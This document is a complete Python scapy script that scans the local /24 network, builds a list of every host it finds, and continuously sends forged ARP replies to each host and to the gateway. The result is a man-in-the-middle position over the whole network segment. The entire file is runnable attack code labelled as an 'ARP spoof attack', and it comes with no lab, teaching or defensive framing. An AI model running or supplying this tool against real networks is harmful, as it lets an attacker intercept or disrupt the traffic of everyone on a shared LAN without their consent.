#!/usr/bin/env python3

from scapy.all import ARP, send, arping
import time
import sys
import os
from ipaddress import ip_network
import netifaces

# === CONFIGURATION ===
interface = "eth0"
spoof_interval = 2  # seconds between spoofed packets
targets = []

# === GET LOCAL IP & GATEWAY ===
def get_gateway():
    gws = netifaces.gateways()
    default = gws.get('default')
    if default and netifaces.AF_INET in default:
        return default[netifaces.AF_INET][0]
    return None

def get_local_ip():
    for iface in netifaces.interfaces():
        addrs = netifaces.ifaddresses(iface)
        if netifaces.AF_INET in addrs:
            ipv4 = addrs[netifaces.AF_INET][0]
            ip = ipv4['addr']
            if ip != "127.0.0.1":
                return ip
    return None

# === GET MAC ADDRESS ===
def get_mac(ip):
    ans, _ = arping(ip, timeout=2, verbose=0, iface=interface)
    for _, rcv in ans:
        return rcv.hwsrc
    return None

# === SPOOF FUNCTION ===
def spoof(victim_ip, spoof_ip, victim_mac):
    pkt = ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=spoof_ip)
    send(pkt, verbose=0, iface=interface)

# === RESTORE ARP ===
def restore(victim_ip, victim_mac, spoof_ip, spoof_mac):
    pkt = ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=spoof_ip, hwsrc=spoof_mac)
    send(pkt, count=5, iface=interface, verbose=0)

# === MAIN ===
gateway_ip = get_gateway()
local_ip = get_local_ip()
if not gateway_ip or not local_ip:
    print("[!] Could not determine local IP or gateway.")
    sys.exit(1)

# Scan the network to find targets
print("[*] Scanning for targets...")
cidr_range = str(ip_network(f"{local_ip}/24", strict=False))
ans, _ = arping(cidr_range, timeout=2, verbose=0, iface=interface)
for _, rcv in ans:
    ip = rcv.psrc
    mac = rcv.hwsrc
    if ip != local_ip and ip != gateway_ip:
        targets.append((ip, mac))

# Get gateway MAC
gateway_mac = get_mac(gateway_ip)
if not gateway_mac:
    print("[!] Could not get gateway MAC.")
    sys.exit(1)

print(f"[*] Launching ARP spoof attack. Targets: {len(targets)} devices.")
try:
    while True:
        for ip, mac in targets:
            spoof(ip, gateway_ip, mac)
            spoof(gateway_ip, ip, gateway_mac)
        time.sleep(spoof_interval)
except KeyboardInterrupt:
    print("[!] Restoring ARP tables...")
    for ip, mac in targets:
        restore(ip, mac, gateway_ip, gateway_mac)
        restore(gateway_ip, gateway_mac, ip, mac)
    print("✅ ARP tables restored. Exiting.")
